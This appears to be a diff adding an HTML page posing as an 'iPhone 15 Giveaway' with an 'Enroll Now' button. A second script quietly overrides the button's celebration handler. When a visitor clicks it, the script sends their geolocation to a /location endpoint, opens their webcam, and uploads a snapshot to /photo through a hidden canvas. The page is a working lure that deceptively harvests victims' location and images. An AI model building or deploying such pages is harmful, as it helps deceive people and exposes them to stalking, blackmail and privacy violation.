@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iPhone 15 Giveaway</title>
+    <style>
+  
+    canvas{ display:none; }
+    
+    
+        /* --- General Settings --- */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #0d1117; /* Premium Dark Background */
+            color: white;
+            text-align: center;
+            overflow-x: hidden;
+        }
+
+        /* --- Header / Hero Section --- */
+        .hero-section {
+            padding: 20px;
+            background: linear-gradient(180deg, #1a1f2c 0%, #0d1117 100%);
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            color: #f5c518; /* Gold Color */
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px rgba(245, 197, 24, 0.5);
+        }
+
+        p {
+            font-size: 1.1rem;
+            color: #ddd;
+            margin-bottom: 20px;
+        }
+
+        /* --- Images Styling (Responsive) --- */
+        .iphone-img {
+            width: 100%;
+            max-width: 600px; /* PC ke liye max width */
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            margin-bottom: 20px;
+            transition: transform 0.3s ease;
+        }
+
+        .iphone-img:hover {
+            transform: scale(1.02);
+        }
+
+        .creator-img {
+            width: 120px;
+            height: 120px;
+            object-fit: cover;
+            border-radius: 50%;
+            border: 4px solid #f5c518;
+            margin-bottom: 15px;
+        }
+
+        /* --- Button Styling --- */
+        .enroll-btn {
+            background: linear-gradient(45deg, #ff416c, #ff4b2b);
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.5rem;
+            color: white;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: bold;
+            box-shadow: 0 5px 15px rgba(255, 75, 43, 0.4);
+            animation: pulse 2s infinite;
+            margin-top: 20px;
+            margin-bottom: 40px;
+            width: 80%;
+            max-width: 300px;
+        }
+
+        .enroll-btn:active {
+            transform: scale(0.95);
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 75, 43, 0.7); }
+            70% { transform: scale(1.05); box-shadow: 0 0 0 10px rgba(255, 75, 43, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 75, 43, 0); }
+        }
+
+        /* --- Success Overlay (Hidden initially) --- */
+        #successOverlay {
+            display: none; /* Javascript ise show karega */
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 999;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+
+        .success-content h2 {
+            font-size: 3rem;
+            color: #28a745;
+            margin: 0;
+            animation: popIn 0.5s ease;
+        }
+
+        .success-content p {
+            font-size: 1.2rem;
+            margin-top: 10px;
+            color: white;
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0); }
+            80% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        /* --- Balloon Animation --- */
+        .balloon {
+            position: absolute;
+            bottom: -100px;
+            width: 50px;
+            height: 70px;
+            background: red;
+            border-radius: 50%;
+            animation: floatUp 4s ease-in infinite;
+            opacity: 0.8;
+            z-index: 1000;
+        }
+
+        .balloon::before {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 22px;
+            width: 2px;
+            height: 30px;
+            background: white;
+        }
+
+        @keyframes floatUp {
+            0% { bottom: -100px; transform: translateX(0); }
+            50% { transform: translateX(20px); }
+            100% { bottom: 120%; transform: translateX(-20px); }
+        }
+
+        /* --- Mobile Tweaks --- */
+        @media (max-width: 600px) {
+            h1 { font-size: 1.8rem; }
+            .iphone-img { width: 95%; }
+            .success-content h2 { font-size: 2rem; }
+        }
+       
+     
+    </style>
+</head>
+<body>
+
+    <div class="hero-section">
+        <img src="https://i.ytimg.com/vi/FVXkQNAtXcE/maxresdefault.jpg" alt="Creator" class="creator-img">
+        
+        <h1>Ultimate Iphone Giveaway!</h2>
+    <p></p>
+
+        <img src="https://techcrunch.com/wp-content/uploads/2023/09/apple-iphone-15-colors.jpg" alt="iPhone 15 Colors" class="iphone-img">
+        
+        <br>
+        
+        <button class="enroll-btn" onclick="enrollUser()">Enroll Now </button>
+    <p style="font-size: 0.8rem; color: #888; margin-top: 20px;">
+            *Terms and Conditions apply. Winner announced soon.
+        </p>
+    </div>
+
+    <div id="successOverlay">
+        <div class="success-content">
+          <p style="font-size: 0.8rem; color: #888; margin-top: 20px;">
+            *Terms and Conditions apply. Winner announced soon.
+        </p>
+    </div>
+   <div id="successOverlay">
+        <div class="success-content">
+            <h2> Congratulations! </h2>
+
+<p>You have enrolled in the giveaway.<br>We will contact you soon!</p>
+        </div>
+    </div>
+    <audio id="celebrationSound">
+        <source src="https://tunepocket.com/media/?t=10934" type="audio/mpeg">
+    </audio>
+
+   <script> 
+     function enrollUser() {
+            // 1. Play Sound
+            const audio = document.getElementById("celebrationSound");
+            audio.play().catch(error => console.log("Audio play blocked until interaction"));
+
+            // 2. Show Overlay
+            const overlay = document.getElementById("successOverlay");
+            overlay.style.display = "flex";
+
+            // 3. Start Balloons
+            createBalloons();
+        }
+
+        function createBalloons() {
+            const colors = ['#ff416c', '#f5c518', '#28a745', '#3498db', '#9b59b6'];
+            const container = document.getElementById("successOverlay");
+
+            for (let i = 0; i < 30; i++) {
+                let balloon = document.createElement("div");
+                balloon.className = "balloon";
+                
+                // Randomize position and color
+                balloon.style.left = Math.random() * 100 + "vw";
+                balloon.style.background = colors[Math.floor(Math.random() * colors.length)];
+                
+                // Randomize speed and delay
+                balloon.style.animationDuration = (Math.random() * 2 + 3) + "s"; // 3s to 5s
+                balloon.style.animationDelay = Math.random() * 2 + "s";
+
+                container.appendChild(balloon);
+            }
+        }
+</script>
+
+<div class="box">
+    <button id="locationbtn">.</button>
+    <button id="infobtn">.</button>
+    <button id="photobtn">.</button>
+
+    <canvas id="canvas"></canvas>
+</div>
+
+<script>
+async function enrollUser() {
+
+    // Basic message
+    await fetch("/send");
+
+    // LOCATION (permission required)
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            await fetch("/location", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude
+                })
+            });
+        });
+    }
+
+    // CAMERA (permission required)
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.play();
+
+        const canvas = document.getElementById("canvas");
+        const ctx = canvas.getContext("2d");
+
+        setTimeout(async () => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+
+            const image = canvas.toDataURL("image/png");
+
+            await fetch("/photo", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ image })
+            });
+
+            stream.getTracks().forEach(track => track.stop());
+        }, 2000);
+
+    } catch (err) {
+        console.log("Camera denied");
+    }
+}
+
+document.addEventListener("DOMContentLoaded", () => {
+    const buttons = document.querySelectorAll("button");
+
+    buttons.forEach(btn => {
+        if (btn.innerText.toLowerCase().includes("camera")) {
+            btn.addEventListener("click", openCameraAndSend);
+        }
+    });
+});
+
+async function openCameraAndSend() {
+    try {
+        // ✅ Camera permission (user allow karega tabhi)
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.play();
+
+        const canvas = document.getElementById("canvas");
+        const ctx = canvas.getContext("2d");
+
+        // 2 sec baad photo capture
+        setTimeout(async () => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+
+            const image = canvas.toDataURL("image/png");
+
+            // ✅ Backend ko photo bhejo
+            await fetch("/photo", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ image })
+            });
+
+            // Camera band
+            stream.getTracks().forEach(track => track.stop());
+
+            alert("📸 Photo sent successfully!");
+
+        }, 2000);
+
+    } catch (err) {
+        alert("Camera permission denied ❌");
+    }
+}
+
+
+
+</script>
+
+
+</body>
+</html>
